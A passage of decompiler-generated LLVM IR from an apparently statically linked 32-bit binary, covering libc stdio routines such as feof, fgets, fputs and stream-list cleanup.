  br i1 %v9_804f22c, label %dec_label_pc_804f24f, label %dec_label_pc_804f231

dec_label_pc_804f231:                             ; preds = %dec_label_pc_804f22c
  %v12_804f231 = icmp eq i32 %v6_804f223, %v6_804f21f
  br i1 %v12_804f231, label %dec_label_pc_804f24f, label %dec_label_pc_804f235

dec_label_pc_804f235:                             ; preds = %dec_label_pc_804f231
  %v1_804f235 = call i32 @_promoted_size(i32 %v1_804f216)
  store i32 %v1_804f235, i32* %ebx.global-to-local, align 4
  %v0_804f23c = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_804f23c, i32* @eax, align 4
  %v1_804f23e = call i32 @_promoted_size(i32 %v1_804f216)
  %v2_804f243 = sub i32 %v1_804f235, %v1_804f23e
  %v8_804f243 = xor i32 %v1_804f235, %v1_804f23e
  %v9_804f243 = xor i32 %v2_804f243, %v1_804f235
  %v10_804f243 = and i32 %v9_804f243, %v8_804f243
  %v11_804f243 = icmp slt i32 %v10_804f243, 0
  %v12_804f243 = icmp eq i32 %v2_804f243, 0
  %v13_804f243 = icmp slt i32 %v2_804f243, 0
  %v3_804f245 = icmp ne i1 %v13_804f243, %v11_804f243
  %v4_804f245 = or i1 %v12_804f243, %v3_804f245
  %v5_804f245 = zext i1 %v4_804f245 to i32
  store i32 %v5_804f245, i32* %eax.global-to-local, align 4
  %v1_804f24b = icmp eq i1 %v4_804f245, false
  br i1 %v1_804f24b, label %dec_label_pc_804f25f, label %dec_label_pc_804f235.dec_label_pc_804f24f_crit_edge

dec_label_pc_804f235.dec_label_pc_804f24f_crit_edge: ; preds = %dec_label_pc_804f235
  %v0_804f24f.pre = load i32, i32* @esp, align 4
  %v1_804f24f.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804f24f

dec_label_pc_804f24f:                             ; preds = %dec_label_pc_804f235.dec_label_pc_804f24f_crit_edge, %dec_label_pc_804f231, %dec_label_pc_804f22c
  %v1_804f24f = phi i32 [ %v1_804f24f.pre, %dec_label_pc_804f235.dec_label_pc_804f24f_crit_edge ], [ %v1_804f21f, %dec_label_pc_804f231 ], [ %v1_804f21f, %dec_label_pc_804f22c ]
  %v0_804f24f = phi i32 [ %v0_804f24f.pre, %dec_label_pc_804f235.dec_label_pc_804f24f_crit_edge ], [ %v0_804f21f, %dec_label_pc_804f231 ], [ %v0_804f21f, %dec_label_pc_804f22c ]
  %v2_804f24f = mul i32 %v1_804f24f, 4
  %v3_804f24f = add i32 %v0_804f24f, 80
  %v4_804f24f = add i32 %v3_804f24f, %v2_804f24f
  %v5_804f24f = inttoptr i32 %v4_804f24f to i32*
  %v6_804f24f = load i32, i32* %v5_804f24f, align 4
  store i32 %v6_804f24f, i32* %eax.global-to-local, align 4
  store i32 %v1_804f216, i32* %ecx.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  store i32 %v6_804f24f, i32* %v5_804f223, align 4
  br label %dec_label_pc_804f25f

dec_label_pc_804f25f:                             ; preds = %dec_label_pc_804f235, %dec_label_pc_804f216, %dec_label_pc_804f24f
  store i32 %tmp76, i32* @ecx, align 4
  %v0_804f263 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804f263 = add i32 %v0_804f263, 1
  store i32 %v1_804f263, i32* %ebp.global-to-local, align 4
  %v3_804f264 = load i32, i32* %v2_804f264, align 4
  %v1_804f267 = add i32 %v3_804f264, 2
  store i32 %v1_804f267, i32* %eax.global-to-local, align 4
  %v5_804f26c = icmp slt i32 %v1_804f263, %v1_804f267
  br i1 %v5_804f26c, label %dec_label_pc_804f1e4, label %dec_label_pc_804f29a

dec_label_pc_804f273:                             ; preds = %dec_label_pc_804f1d7
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_804f277 = add i32 %tmp76, 38
  %v2_804f277 = inttoptr i32 %v1_804f277 to i8*
  store i8 1, i8* %v2_804f277, align 1
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_804f280 = add i32 %tmp76, 28
  %v2_804f280 = inttoptr i32 %v1_804f280 to i32*
  %v3_804f280 = load i32, i32* %v2_804f280, align 4
  %v2_804f283 = mul i32 %v3_804f280, 4
  %v2_804f287 = ptrtoint i32* %stack_var_-20 to i32
  %v1_804f28e = add i32 %tmp76, 40
  store i32 %v1_804f28e, i32* %eax.global-to-local, align 4
  %v3_804f292 = inttoptr i32 %v1_804f28e to i16*
  %v4_804f292 = call i32 @memcpy(i16* %v3_804f292, i32 %v2_804f287, i32 %v2_804f283)
  store i32 %v4_804f292, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f29a

dec_label_pc_804f29a:                             ; preds = %dec_label_pc_804f25f, %dec_label_pc_804f273
  %stack_var_-88.6 = phi i32 [ %stack_var_-88.3, %dec_label_pc_804f273 ], [ %stack_var_-88.5, %dec_label_pc_804f25f ]
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %stack_var_-88.6, i32* %eax.global-to-local, align 4
  %v2_804f2a2 = inttoptr i32 %v1_804ef43 to i8*
  %v3_804f2a2 = load i8, i8* %v2_804f2a2, align 1
  %v5_804f2a2 = icmp slt i8 %v3_804f2a2, 0
  store i32 %stack_var_-88.6, i32* %v2_804ef3c, align 4
  br i1 %v5_804f2a2, label %dec_label_pc_804f2b2, label %dec_label_pc_804f2ab

dec_label_pc_804f2ab:                             ; preds = %dec_label_pc_804f29a
  %v0_804f2ab = load i32, i32* @esi, align 4
  %v1_804f2ab = add i32 %v0_804f2ab, 1
  store i32 %v1_804f2ab, i32* %eax.global-to-local, align 4
  %v1_804f2ae = load i32, i32* @ecx, align 4
  %v2_804f2ae = inttoptr i32 %v1_804f2ae to i32*
  store i32 %v1_804f2ab, i32* %v2_804f2ae, align 4
  br label %dec_label_pc_804f2c5

dec_label_pc_804f2b2:                             ; preds = %dec_label_pc_804f29a
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %v4_804ef10, i32* %edx.global-to-local, align 4
  %v0_804f2ba = load i32, i32* @esi, align 4
  %v2_804f2ba = sub i32 %v0_804f2ba, %v4_804ef10
  store i32 %v2_804f2ba, i32* %esi.global-to-local, align 4
  %v1_804f2bc = mul i32 %v2_804f2ba, 4
  %v2_804f2bc = add i32 %v1_804f2bc, 224
  store i32 %v2_804f2bc, i32* %eax.global-to-local, align 4
  %v2_804f2c3 = load i32, i32* %arg1, align 4
  %v4_804f2c3 = add i32 %v2_804f2c3, %v2_804f2bc
  store i32 %v4_804f2c3, i32* %arg1, align 4
  br label %dec_label_pc_804f2c5

dec_label_pc_804f2c5:                             ; preds = %dec_label_pc_804f2ab, %dec_label_pc_804f2b2
  store i32 %tmp76, i32* @edx, align 4
  %v1_804f2c9 = add i32 %tmp76, 28
  %v2_804f2c9 = inttoptr i32 %v1_804f2c9 to i32*
  %v3_804f2c9 = load i32, i32* %v2_804f2c9, align 4
  store i32 %v3_804f2c9, i32* %eax.global-to-local, align 4
  %v1_804f2cc = add i32 %v3_804f2c9, 2
  br label %dec_label_pc_804f2d4

dec_label_pc_804f2d1:                             ; preds = %dec_label_pc_804ef61, %dec_label_pc_804effb, %dec_label_pc_804f02e, %dec_label_pc_804f0a9, %dec_label_pc_804f095, %dec_label_pc_804f08c, %dec_label_pc_804f209, %dec_label_pc_804f1c0, %dec_label_pc_804f10b
  br label %dec_label_pc_804f2d4

dec_label_pc_804f2d4:                             ; preds = %dec_label_pc_804f2c5, %dec_label_pc_804f2d1
  %storemerge6 = phi i32 [ %v1_804f2cc, %dec_label_pc_804f2c5 ], [ -1, %dec_label_pc_804f2d1 ]
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_804f2d7 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804f2d7, i32* @ebx, align 4
  store i32 %v0_804ef0f, i32* @esi, align 4
  store i32 %v0_804ef0e, i32* @edi, align 4
  ret i32 %storemerge6

; uselistorder directives
  uselistorder i32 %v1_804f263, { 0, 2, 1 }
  uselistorder i32 %v2_804f243, { 1, 2, 0 }
  uselistorder i32 %v1_804f235, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804f216, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_804f209, { 1, 0 }
  uselistorder i32 %v5_804f203, { 1, 2, 0 }
  uselistorder i32 %v0_804f216, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
  uselistorder i32 %v1_804f1e4, { 1, 0 }
  uselistorder i32 %stack_var_-88.4, { 1, 0, 2 }
  uselistorder i32 %v0_804f1fa, { 0, 2, 3, 1, 5, 4 }
  uselistorder i32 %v1_804f175, { 1, 2, 0 }
  uselistorder i32 %v1_804f14b, { 1, 2, 0 }
  uselistorder i32 %v0_804f175, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804f111, { 1, 0 }
  uselistorder i32 %v1_804f0fe, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_804f107, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_804f0f1, { 0, 2, 3, 1 }
  uselistorder i32 %v6_804f0e7, { 1, 0 }
  uselistorder i32 %v1_804f0c9, { 1, 0 }
  uselistorder i32 %v0_804f0e7.pre.pre, { 0, 3, 1, 2 }
  uselistorder i32 %stack_var_-88.3, { 3, 2, 1, 4, 0 }
  uselistorder i32 %stack_var_-32.3, { 1, 0 }
  uselistorder i32 %v1_804f0ac, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_804f0a3, { 1, 2, 0 }
  uselistorder i32 %v0_804f069, { 1, 0 }
  uselistorder i32 %v1_804f05b, { 1, 0 }
  uselistorder i32 %v1_804f056, { 0, 1, 3, 2 }
  uselistorder i32 %v6_804f054, { 2, 0, 1 }
  uselistorder i32 %v0_804f076, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_804f011, { 1, 2, 0 }
  uselistorder i32 %v0_804efe9, { 1, 2, 3, 6, 0, 4, 5, 7 }
  uselistorder i32 %v2_804efdf, { 1, 2, 0 }
  uselistorder i32 %v6_804efdd, { 0, 2, 1 }
  uselistorder i32 %v0_804efdc, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v1_804efd5, { 1, 2, 3, 9, 7, 4, 5, 8, 6, 11, 12, 10, 0, 13 }
  uselistorder i32 %v3_804efd5, { 2, 1, 0 }
  uselistorder i32 %v1_804efcd, { 1, 0 }
  uselistorder i32 %stack_var_-88.1, { 0, 1, 3, 4, 2, 6, 5, 7 }
  uselistorder i32 %v8_804efb3, { 1, 0, 3, 2 }
  uselistorder i32 %v1_804ef89, { 0, 2, 1 }
  uselistorder i32 %v0_804ef76, { 2, 0, 1 }
  uselistorder i32 %v4_804ef10, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 %tmp76, { 24, 23, 22, 21, 0, 20, 19, 18, 17, 16, 14, 13, 12, 1, 3, 15, 2, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9 }
  uselistorder i32* %edi.global-to-local, { 0, 1, 4, 2, 5, 3, 6, 7 }
  uselistorder i32* %ebp.global-to-local, { 2, 3, 5, 4, 6, 0, 1, 7 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 35, 31, 30, 32, 33, 36, 34, 42, 37, 38, 39, 40, 41, 43, 44 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 -9, { 1, 0 }
  uselistorder i32 -5, { 4, 1, 2, 3, 0 }
  uselistorder i32 -134575051, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_80573d5.172 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i32* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_804f2d4, { 1, 0 }
  uselistorder label %dec_label_pc_804f2d1, { 6, 7, 8, 3, 4, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_804f2c5, { 1, 0 }
  uselistorder label %dec_label_pc_804f29a, { 1, 0 }
  uselistorder label %dec_label_pc_804f25f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f203, { 1, 0 }
  uselistorder label %dec_label_pc_804f1d7, { 1, 0 }
  uselistorder label %dec_label_pc_804f13f, { 1, 0 }
  uselistorder label %dec_label_pc_804f10b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f0e2, { 1, 0 }
  uselistorder label %dec_label_pc_804f0b9, { 1, 0 }
  uselistorder label %dec_label_pc_804f080, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_804f023, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804efdd, { 1, 0 }
  uselistorder label %dec_label_pc_804efdc, { 1, 0 }
  uselistorder label %dec_label_pc_804efc3, { 1, 0 }
  uselistorder label %dec_label_pc_804efac, { 1, 0 }
  uselistorder label %dec_label_pc_804efac.outer, { 2, 0, 1 }
}

define i32 @feof(i16* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v12_804f2df = ptrtoint i32* %stack_var_-28 to i32
  %v4_804f2e2 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804f2e2, i32* %esi.global-to-local, align 4
  %v1_804f2e6 = add i32 %v4_804f2e2, 52
  %v2_804f2e6 = inttoptr i32 %v1_804f2e6 to i32*
  %v3_804f2e6 = load i32, i32* %v2_804f2e6, align 4
  %v1_804f2e9 = icmp eq i32 %v3_804f2e6, 0
  %v1_804f2eb = icmp eq i1 %v1_804f2e9, false
  br i1 %v1_804f2eb, label %dec_label_pc_804f30c, label %dec_label_pc_804f2ed

dec_label_pc_804f2ed:                             ; preds = %entry
  %v1_804f2ed = add i32 %v4_804f2e2, 56
  store i32 %v1_804f2ed, i32* %ebx.global-to-local, align 4
  store i32 %v12_804f2df, i32* @eax, align 4
  %v2_804f2fc = call i32 @__pthread_return_void(i32 %v12_804f2df, i32 134552351)
  %v1_804f304 = call i32 @__pthread_return_0(i32 %v1_804f2ed)
  %v0_804f30e.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f30c

dec_label_pc_804f30c:                             ; preds = %entry, %dec_label_pc_804f2ed
  %v0_804f30e = phi i32 [ %v4_804f2e2, %entry ], [ %v0_804f30e.pre, %dec_label_pc_804f2ed ]
  %v1_804f30e = inttoptr i32 %v0_804f30e to i16*
  %v2_804f30e = load i16, i16* %v1_804f30e, align 2
  %v3_804f30e = zext i16 %v2_804f30e to i32
  store i32 %v3_804f30e, i32* %ebx.global-to-local, align 4
  br i1 %v1_804f2eb, label %dec_label_pc_804f324, label %dec_label_pc_804f313

dec_label_pc_804f313:                             ; preds = %dec_label_pc_804f30c
  store i32 %v12_804f2df, i32* @eax, align 4
  %v2_804f31c = call i32 @__pthread_return_void(i32 %v12_804f2df, i32 1)
  %v0_804f327.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f324

dec_label_pc_804f324:                             ; preds = %dec_label_pc_804f30c, %dec_label_pc_804f313
  %v0_804f327 = phi i32 [ %v3_804f30e, %dec_label_pc_804f30c ], [ %v0_804f327.pre, %dec_label_pc_804f313 ]
  %v1_804f327 = and i32 %v0_804f327, 4
  ret i32 %v1_804f327

; uselistorder directives
  uselistorder i32 %v12_804f2df, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_804f324, { 1, 0 }
  uselistorder label %dec_label_pc_804f30c, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_804f330 = load i32, i32* @edi, align 4
  %v0_804f331 = load i32, i32* @esi, align 4
  %v0_804f332 = load i32, i32* @ebx, align 4
  %v12_804f333 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg3, i32* @esi, align 4
  %v1_804f33a = add i32 %arg3, 52
  %v2_804f33a = inttoptr i32 %v1_804f33a to i32*
  %v3_804f33a = load i32, i32* %v2_804f33a, align 4
  store i32 %v3_804f33a, i32* @edi, align 4
  %v1_804f33d = icmp eq i32 %v3_804f33a, 0
  %v1_804f33f = icmp eq i1 %v1_804f33d, false
  br i1 %v1_804f33f, label %entry.dec_label_pc_804f360_crit_edge, label %dec_label_pc_804f341

entry.dec_label_pc_804f360_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804f360

dec_label_pc_804f341:                             ; preds = %entry
  %v1_804f341 = add i32 %arg3, 56
  store i32 %v1_804f341, i32* @ebx, align 4
  store i32 %v12_804f333, i32* @eax, align 4
  %v2_804f350 = call i32 @__pthread_return_void(i32 %v12_804f333, i32 134552351)
  %v0_804f355 = load i32, i32* @ebx, align 4
  %v1_804f358 = call i32 @__pthread_return_0(i32 %v0_804f355)
  %v0_804f361.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f360

dec_label_pc_804f360:                             ; preds = %entry.dec_label_pc_804f360_crit_edge, %dec_label_pc_804f341
  %v0_804f361 = phi i32 [ %arg3, %entry.dec_label_pc_804f360_crit_edge ], [ %v0_804f361.pre, %dec_label_pc_804f341 ]
  %v0_804f360 = load i32, i32* @edx, align 4
  %v4_804f36a = inttoptr i32 %arg1 to i8*
  %v5_804f36a = call i32 @__GI_fgets_unlocked(i8* %v4_804f36a, i32 %arg2, i32 %v0_804f361, i32 %v0_804f360)
  store i32 %v5_804f36a, i32* %ebx.global-to-local, align 4
  br i1 %v1_804f33f, label %dec_label_pc_804f389, label %dec_label_pc_804f378

dec_label_pc_804f378:                             ; preds = %dec_label_pc_804f360
  store i32 %v12_804f333, i32* @eax, align 4
  %v2_804f381 = call i32 @__pthread_return_void(i32 %v12_804f333, i32 1)
  %v0_804f38c.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f389

dec_label_pc_804f389:                             ; preds = %dec_label_pc_804f360, %dec_label_pc_804f378
  %v0_804f38c = phi i32 [ %v5_804f36a, %dec_label_pc_804f360 ], [ %v0_804f38c.pre, %dec_label_pc_804f378 ]
  store i32 %v0_804f332, i32* @ebx, align 4
  store i32 %v0_804f331, i32* @esi, align 4
  store i32 %v0_804f330, i32* @edi, align 4
  ret i32 %v0_804f38c

; uselistorder directives
  uselistorder i32 %v12_804f333, { 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804f389, { 1, 0 }
  uselistorder label %dec_label_pc_804f360, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_804f394 = load i32, i32* @edi, align 4
  %v0_804f395 = load i32, i32* @esi, align 4
  %v0_804f396 = load i32, i32* @ebx, align 4
  %v12_804f397 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg2, i32* @esi, align 4
  %v1_804f39e = add i32 %arg2, 52
  %v2_804f39e = inttoptr i32 %v1_804f39e to i32*
  %v3_804f39e = load i32, i32* %v2_804f39e, align 4
  store i32 %v3_804f39e, i32* @edi, align 4
  %v1_804f3a1 = icmp eq i32 %v3_804f39e, 0
  %v1_804f3a3 = icmp eq i1 %v1_804f3a1, false
  br i1 %v1_804f3a3, label %entry.dec_label_pc_804f3c4_crit_edge, label %dec_label_pc_804f3a5

entry.dec_label_pc_804f3c4_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804f3c4

dec_label_pc_804f3a5:                             ; preds = %entry
  %v1_804f3a5 = add i32 %arg2, 56
  store i32 %v1_804f3a5, i32* @ebx, align 4
  store i32 %v12_804f397, i32* @eax, align 4
  %v2_804f3b4 = call i32 @__pthread_return_void(i32 %v12_804f397, i32 134552351)
  %v0_804f3b9 = load i32, i32* @ebx, align 4
  %v1_804f3bc = call i32 @__pthread_return_0(i32 %v0_804f3b9)
  %v0_804f3c6.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f3c4

dec_label_pc_804f3c4:                             ; preds = %entry.dec_label_pc_804f3c4_crit_edge, %dec_label_pc_804f3a5
  %v0_804f3c6 = phi i32 [ %arg2, %entry.dec_label_pc_804f3c4_crit_edge ], [ %v0_804f3c6.pre, %dec_label_pc_804f3a5 ]
  %v0_804f3c4 = load i32, i32* @edx, align 4
  %v4_804f3cb = inttoptr i32 %arg1 to i8*
  %v5_804f3cb = call i32 @__GI_fputs_unlocked(i8* %v4_804f3cb, i32 %v0_804f3c6, i32 %v0_804f3c4, i32 %v0_804f3c4)
  store i32 %v5_804f3cb, i32* %ebx.global-to-local, align 4
  br i1 %v1_804f3a3, label %dec_label_pc_804f3ea, label %dec_label_pc_804f3d9

dec_label_pc_804f3d9:                             ; preds = %dec_label_pc_804f3c4
  store i32 %v12_804f397, i32* @eax, align 4
  %v2_804f3e2 = call i32 @__pthread_return_void(i32 %v12_804f397, i32 1)
  %v0_804f3ed.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f3ea

dec_label_pc_804f3ea:                             ; preds = %dec_label_pc_804f3c4, %dec_label_pc_804f3d9
  %v0_804f3ed = phi i32 [ %v5_804f3cb, %dec_label_pc_804f3c4 ], [ %v0_804f3ed.pre, %dec_label_pc_804f3d9 ]
  store i32 %v0_804f396, i32* @ebx, align 4
  store i32 %v0_804f395, i32* @esi, align 4
  store i32 %v0_804f394, i32* @edi, align 4
  ret i32 %v0_804f3ed

; uselistorder directives
  uselistorder i32 %v12_804f397, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804f3ea, { 1, 0 }
  uselistorder label %dec_label_pc_804f3c4, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_804f403 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804f403, i32* @eax, align 4
  %v2_804f408 = call i32 @__pthread_return_void(i32 %v2_804f403, i32 134552351)
  %v1_804f414 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8059e14.158 to i32))
  %v0_804f419 = load i32, i32* @global_var_805e0a4.159, align 4
  %v8_804f421 = icmp eq i32 %v0_804f419, 1
  %v1_804f422 = icmp eq i1 %v8_804f421, false
  br i1 %v1_804f422, label %dec_label_pc_804f4b9, label %dec_label_pc_804f428

dec_label_pc_804f428:                             ; preds = %entry
  %v0_804f428 = load i32, i32* @global_var_805e0a8.160, align 8
  %tmp29 = icmp slt i32 %v0_804f428, 1
  br i1 %tmp29, label %dec_label_pc_804f4b9, label %dec_label_pc_804f435

dec_label_pc_804f435:                             ; preds = %dec_label_pc_804f428
  store i32 0, i32* @esi, align 4
  %v2_804f442 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_804f442, i32* @eax, align 4
  %v2_804f447 = call i32 @__pthread_return_void(i32 %v2_804f442, i32 134552351)
  %v1_804f453 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8059dfc.162 to i32))
  %v0_804f458 = load i32, i32* bitcast (i32** @global_var_8059df8.163 to i32*), align 8
  store i32 %v0_804f458, i32* %edx.global-to-local, align 4
  %v1_804f49a3 = icmp eq i32 %v0_804f458, 0
  %v1_804f49c10 = icmp eq i1 %v1_804f49a3, false
  br i1 %v1_804f49c10, label %dec_label_pc_804f463, label %dec_label_pc_804f49e

dec_label_pc_804f463:                             ; preds = %dec_label_pc_804f435, %dec_label_pc_804f498
  %v1_804f46314.in = phi i32 [ %v0_804f498, %dec_label_pc_804f498 ], [ %v0_804f458, %dec_label_pc_804f435 ]
  %v1_804f46314 = inttoptr i32 %v1_804f46314.in to i16*
  %v2_804f463 = load i16, i16* %v1_804f46314, align 2
  %v1_804f466 = add i32 %v1_804f46314.in, 32
  %v2_804f466 = inttoptr i32 %v1_804f466 to i32*
  %v3_804f466 = load i32, i32* %v2_804f466, align 4
  store i32 %v3_804f466, i32* @ebx, align 4
  %v1_804f469 = and i16 %v2_804f463, -32720
  %v6_804f46e = icmp eq i16 %v1_804f469, 48
  br i1 %v6_804f46e, label %dec_label_pc_804f477, label %dec_label_pc_804f473

dec_label_pc_804f473:                             ; preds = %dec_label_pc_804f463
  store i32 %v1_804f46314.in, i32* @esi, align 4
  br label %dec_label_pc_804f498

dec_label_pc_804f477:                             ; preds = %dec_label_pc_804f463
  %v0_804f477 = load i32, i32* @esi, align 4
  %v1_804f477 = icmp eq i32 %v0_804f477, 0
  %v1_804f479 = icmp eq i1 %v1_804f477, false
  br i1 %v1_804f479, label %dec_label_pc_804f483, label %dec_label_pc_804f47b

dec_label_pc_804f47b:                             ; preds = %dec_label_pc_804f477
  store i32 %v3_804f466, i32* bitcast (i32** @global_var_8059df8.163 to i32*), align 8
  br label %dec_label_pc_804f486

dec_label_pc_804f483:                             ; preds = %dec_label_pc_804f477
  %v2_804f483 = add i32 %v0_804f477, 32
  %v3_804f483 = inttoptr i32 %v2_804f483 to i32*
  store i32 %v3_804f466, i32* %v3_804f483, align 4
  %v0_804f486.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f486

dec_label_pc_804f486:                             ; preds = %dec_label_pc_804f47b, %dec_label_pc_804f483
  %v0_804f48f = phi i32 [ %v1_804f46314.in, %dec_label_pc_804f47b ], [ %v0_804f486.pre, %dec_label_pc_804f483 ]
  %v1_804f486 = add i32 %v0_804f48f, 1
  %v2_804f486 = inttoptr i32 %v1_804f486 to i8*
  %v3_804f486 = load i8, i8* %v2_804f486, align 1
  %v4_804f486 = and i8 %v3_804f486, 32
  %v5_804f486 = icmp eq i8 %v4_804f486, 0
  br i1 %v5_804f486, label %dec_label_pc_804f498, label %dec_label_pc_804f48c

dec_label_pc_804f48c:                             ; preds = %dec_label_pc_804f486
  %v1_804f490 = call i32 @free(i32 %v0_804f48f)
  br label %dec_label_pc_804f498

dec_label_pc_804f498:                             ; preds = %dec_label_pc_804f486, %dec_label_pc_804f473, %dec_label_pc_804f48c
  %v0_804f498 = load i32, i32* @ebx, align 4
  store i32 %v0_804f498, i32* %edx.global-to-local, align 4
  %v1_804f49a = icmp eq i32 %v0_804f498, 0
  %v1_804f49c = icmp eq i1 %v1_804f49a, false
  br i1 %v1_804f49c, label %dec_label_pc_804f463, label %dec_label_pc_804f49e

dec_label_pc_804f49e:                             ; preds = %dec_label_pc_804f498, %dec_label_pc_804f435
  store i32 %v2_804f442, i32* @eax, align 4
  %v2_804f4a7 = call i32 @__pthread_return_void(i32 %v2_804f442, i32 1)
  store i32 0, i32* @global_var_805e0a8.160, align 8
  %v0_804f4b9.pre = load i32, i32* @global_var_805e0a4.159, align 4
  br label %dec_label_pc_804f4b9

dec_label_pc_804f4b9:                             ; preds = %dec_label_pc_804f428, %entry, %dec_label_pc_804f49e
  %v0_804f4b9 = phi i32 [ %v0_804f419, %dec_label_pc_804f428 ], [ %v0_804f419, %entry ], [ %v0_804f4b9.pre, %dec_label_pc_804f49e ]
  %v1_804f4be = add i32 %v0_804f4b9, -1
  store i32 %v1_804f4be, i32* @global_var_805e0a4.159, align 4
  store i32 %v2_804f403, i32* @eax, align 4
  %v2_804f4cd = call i32 @__pthread_return_void(i32 %v2_804f403, i32 1)
  ret i32 %v2_804f4cd

; uselistorder directives
  uselistorder i32 %v0_804f498, { 1, 2, 0 }
  uselistorder i32 %v1_804f46314.in, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804f419, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804f4b9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f498, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f486, { 1, 0 }
  uselistorder label %dec_label_pc_804f463, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v0_804f4d8 = load i32, i32* @ebp, align 4
  store i32 0, i32* @ebp, align 4
  %v0_804f4db = load i32, i32* @edi, align 4
  %v0_804f4dc = load i32, i32* @esi, align 4
  %v0_804f4dd = load i32, i32* @ebx, align 4
  %v4_804f4e1 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804f4e1, i32* @ebx, align 4
  %v10_804f4e5 = icmp eq i16* %arg1, inttoptr (i32 134585848 to i16*)
  br i1 %v10_804f4e5, label %dec_label_pc_804f4f9, label %dec_label_pc_804f4ed

dec_label_pc_804f4ed:                             ; preds = %entry
  %v2_804f4ed = icmp eq i16* %arg1, null
  store i32 256, i32* @ebp, align 4
  %v1_804f4f3 = icmp eq i1 %v2_804f4ed, false
  br i1 %v1_804f4f3, label %dec_label_pc_804f5f1, label %dec_label_pc_804f4f9

dec_label_pc_804f4f9:                             ; preds = %dec_label_pc_804f4ed, %entry
  store i32 0, i32* @edi, align 4
  %v2_804f506 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804f506, i32* @ebx, align 4
  %v2_804f50b = call i32 @__pthread_return_void(i32 %v2_804f506, i32 134552351)
  %v1_804f517 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8059e14.158 to i32))
  %v0_804f51c = load i32, i32* @global_var_805e0a4.159, align 4
  store i32 ptrtoint (i32* @global_var_8059e14.158 to i32), i32* @ecx, align 4
  %v1_804f523 = add i32 %v0_804f51c, 1
  store i32 %v1_804f523, i32* @eax, align 4
